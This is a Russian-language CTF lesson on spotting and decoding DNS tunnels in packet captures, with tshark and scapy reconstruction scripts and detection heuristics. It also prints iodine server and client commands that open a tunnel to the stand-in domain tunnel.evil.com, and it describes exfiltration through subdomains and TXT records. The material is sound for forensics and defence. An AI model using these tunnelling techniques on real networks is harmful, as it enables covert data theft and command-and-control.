## Почему DNS — идеальный covert-канал

DNS почти никогда не блокируют: без него не работает ничего, а запросы уходят наружу даже из самой закрытой сети. Поэтому туннелирование данных через DNS — классический способ эксфильтрации и C2. В CTF это задачи двух видов: **(1) восстановить данные из перехваченного PCAP** и **(2) понять, что туннель есть, и извлечь полезное**.

Ключевое свойство: имена доменов регистронезависимы и допускают произвольные метки (labels) длиной до 63 байт, а всякое имя можно представить как `base32/base64/hex`-строку. Сервер атакующего владеет зоной `evil.com` и логирует все поддомены; клиент шлёт `data.evil.com`.

## Кодирование данных в поддомене

Простейший туннель — кодировать данные в левой метке:

```
1a2b3c4d.evil.com   → 4 байта hex
MFRGGZDF.evil.com   → base32 от "abcd"
```

Base32 популярен, потому что алфавит `A–Z2–7` регистронезависим и безопасен для DNS. Base64 требует замены `+`/`/`/`=` и потому встречается реже. Данные бьют на чанки по ~30–60 байт, добавляя номер последовательности.

Восстановление из списка имён:

```bash
$ grep -oE '[a-z0-9]+\.evil\.com' dns.log | sort -u
$ python3 - <<'PY'
import base64, re
names = open('dns.log').read().split()
labels = [n.split('.')[0] for n in names if n.endswith('.evil.com')]
b32 = ''.join(labels).upper()
b32 += '=' * (-len(b32) % 8)
print(base64.b32decode(b32))
PY
```

Порядок чанков восстанавливают по номеру в метке (`0001`, `0002`…) или по времени в PCAP.

## TXT, NULL, CNAME и другие типы записей

Данные прячут не только в имени, но и в ответах:

- **TXT** — до 255 байт на строку, можно много строк. Идеально для конфигов и ключей.
- **NULL** — произвольные бинарные данные (RFC 1035), редко используется легитимно.
- **CNAME** — ответ ссылается на подконтрольный домен, куда «сливается» поток.
- **MX/AAAA** — тоже можно использовать для кодирования.

```bash
$ dig +short TXT evil.com
"part1=ZmxhZ3tkbnNf"
$ dig +short NULL evil.com
$ dig +short A data1.evil.com
```

## Инструменты туннелирования: iodine, dnscat2, dns2tcp

Готовые туннели (для понимания, что искать в трафике):

- **iodine** — полноценный IP-over-DNS, требует NS-записи на домен. Даёт «сетевой интерфейс» через DNS.
- **dnscat2** — C2-канал через DNS, команды и файлы.
- **dns2tcp** — туннель TCP-over-DNS.

```bash
# сервер (атакующий, владеет ns1.evil.com)
sudo iodined -f -c -P secret 10.0.0.1 tunnel.evil.com
# клиент (жертва)
sudo iodine -f -P secret tunnel.evil.com
```

В PCAP такие туннели выдают себя **аномально длинными** и **высокоэнтропийными** поддоменами, большим числом запросов к одному домену, редкими типами записей.

## Извлечение из PCAP: tshark и scapy

```bash
# все DNS-запросы типа A к evil.com
tshark -r capture.pcap -Y 'dns.qry.name contains "evil.com"' \
  -T fields -e dns.qry.name | sort -u
# все TXT-ответы
tshark -r capture.pcap -Y 'dns.resp.type == 16' -T fields -e dns.txt
```

Реконструкция на scapy:

```python
from scapy.all import rdpcap, DNS, DNSQR
pkts = rdpcap('capture.pcap')
names = []
for p in pkts:
    if p.haslayer(DNSQR) and b'evil.com' in p[DNSQR].qname:
        names.append(p[DNSQR].qname.decode().split('.')[0])
import base64
b = ''.join(names).upper(); b += '=' * (-len(b) % 8)
print(base64.b32decode(b))
```

## Практика: разбор перехваченного туннеля

Задача: `dns.pcap`. Смотрим статистику запросов по именам:

```bash
$ tshark -r dns.pcap -q -z io,stat,0
$ tshark -r dns.pcap -Y dns -T fields -e dns.qry.name | sort | uniq -c | sort -rn | head
  512  aGVsbG8.dGhpcw.evil.com
  128  1.2.3.4.evil.com
```

Если левые метки — base32, декодируем. Если данные разбиты на несколько меток (`aGVsbG8.dGhpcw`), склеиваем их **в порядке слева-направо** и только потом декодируем — частая ошибка: декодировать каждую метку отдельно. Проверяйте также, не пронумерованы ли чанки (`001.…`, `002.…`).

## Детект аномального DNS

Признаки туннеля (полезно для blue team и для «какую из задач решать»):

- Один домен, тысячи поддоменов за короткое время.
- Метки длиной 50–63 символа, высокая энтропия (похоже на base32/hex).
- Много запросов типа TXT/NULL/CNAME, нетипичных для сети.
- Постоянный «сердцебит» — запросы каждые N секунд.
- Большой объём ответов в TXT.

```bash
tshark -r dns.pcap -Y 'dns.qry.name' -T fields -e dns.qry.name \
  | awk -F. '{print $NF"."$(NF-1)}' | sort | uniq -c | sort -rn | head
```

## Частые ошибки и подводные камни

- **Декодировать каждую метку отдельно**, а не склеенный поток — ломает base32/base64.
- **Не учитывать регистр**: DNS-имена регистронезависимы, `Base32` даёт uppercase — приводите к одному регистру.
- **Пропускать padding** `=` при base32/base64-декодировании (кратно 8 символам).
- **Смотреть только A-запросы** — данные часто в TXT/NULL/CNAME.
- **Игнорировать порядок** чанков — сортируйте по времени или по номеру в метке.
- **Забывать про ICMP/DNS-микс** — иногда туннель прячется в других протоколах.

## Восстановление порядка и сборка потока

Главная сложность DNS-туннелей — не декодирование, а **порядок**. Данные разбиты на чанки, и склеивать их нужно правильно. Три распространённых схемы нумерации:

1. **Порядковый номер в метке**: `001.aGVs.evil.com`, `002.bG8g.evil.com` — сортировать по номеру.
2. **Счётчик в отдельной метке**: `aGVs.1.evil.com`, `bG8g.2.evil.com`.
3. **Только по времени** — сортировать пакеты PCAP по timestamp.

Пример сборки с сортировкой по времени:

```python
from scapy.all import rdpcap, DNSQR
import base64
pkts = rdpcap('dns.pcap')
chunks = []
for p in pkts:
    if p.haslayer(DNSQR):
        q = p[DNSQR].qname.decode().rstrip('.')
        if q.endswith('evil.com'):
            left = q.split('.evil.com')[0].replace('.', '')
            chunks.append((float(p.time), left))
chunks.sort()                       # по времени
b32 = ''.join(c for _, c in chunks).upper()
b32 += '=' * (-len(b32) % 8)
print(base64.b32decode(b32))
```

Если декодирование «почти получилось» (виден текст, но с мусором) — почти всегда проблема в порядке чанков или в лишних метках (например, метка-идентификатор сессии, которую нужно выбросить).

## Разбор реального туннеля dnscat2

dnscat2 кодирует данные в поддоменах в base32 и использует TXT-ответы для обратного канала. В трафике это выглядит так:

```
$ tshark -r dnscat.pcap -Y 'dns' -T fields -e dns.qry.name | head -5
a1b2c3d4e5f6.tunnel.evil.com
g7h8i9j0k1l2.tunnel.evil.com
m3n4o5p6q7r8.tunnel.evil.com
```

Особенности, которые надо учесть:

- Метки — **base32 без padding**; склеивать по порядку и добавлять `=` до кратности 8.
- Часть байт — служебные (тип пакета, ID сессии), а не полезная нагрузка; иногда первые несколько байт после декодирования нужно отбросить.
- Обратный поток (ответы сервера) лежит в TXT-записях — их собирают отдельно и декодируют тем же способом.

```bash
# ответы сервера
tshark -r dnscat.pcap -Y 'dns.resp.type == 16' -T fields -e dns.txt | head
```

## Практика: сжатие и шифрование внутри туннеля

Иногда декодированный из DNS поток оказывается **не текстом, а сжатым/зашифрованным блобом**. Проверяйте первые байты:

```bash
$ python3 decode.py > out.bin
$ file out.bin
out.bin: gzip compressed data
$ zcat out.bin | head
```

Если `file` говорит `data` — попробуйте распознать XOR-ключ (часто один байт), gzip/zlib-сигнатуры (`1f 8b`, `78 9c`), или что это архив. Двухслойные задачи (DNS → base32 → gzip → флаг) в CTF встречаются регулярно.

## Почему DNS устойчив и что это значит для детекта

DNS-туннель сложно убить, потому что:

- Резолверы обычно разрешают исходящий DNS даже при запрете всего остального.
- Данные уходят «легально», в виде обычных запросов.
- Трафик можно замаскировать под популярный домен (или использовать реальный CDN как прикрытие).

Именно поэтому детект строится на **аномалиях, а не на блокировке**: длина меток, энтропия, частота, типы записей. Для CTF это означает: если в PCAP есть один домен с сотнями поддоменов — это почти наверняка туннель, и данные нужно собирать из **всех** его запросов.

## Итоговый алгоритм для задачи с DNS

1. `tshark -r f.pcap -Y dns -T fields -e dns.qry.name | sort | uniq -c | sort -rn` — найти «хаб»-домен.
2. Собрать все поддомены этого домена (A/TXT/NULL/CNAME).
3. Отделить данные от служебных меток, отсортировать по времени/номеру.
4. Склеить, декодировать base32/hex/base64.
5. Проверить результат `file` — возможно, это gzip/архив/шифртекст.
6. При необходимости собрать обратный поток из TXT-ответов.

## Что делать дальше / решение

- Вытащите все имена: `tshark -T fields -e dns.qry.name`, `sort -u`.
- Определите домен-«хаб» и префикс-метку с данными.
- Склейте метки, декодируйте base32/hex; проверьте TXT/NULL-ответы.
- Если данные в ответах — соберите `dns.txt`/`dns.a` по времени.
- Если это iodine/dnscat2 — данные всё равно кодированы; ищите base32-поток.
- Нет данных в DNS — проверьте, не тайминговый ли это канал (см. урок про тайминги).
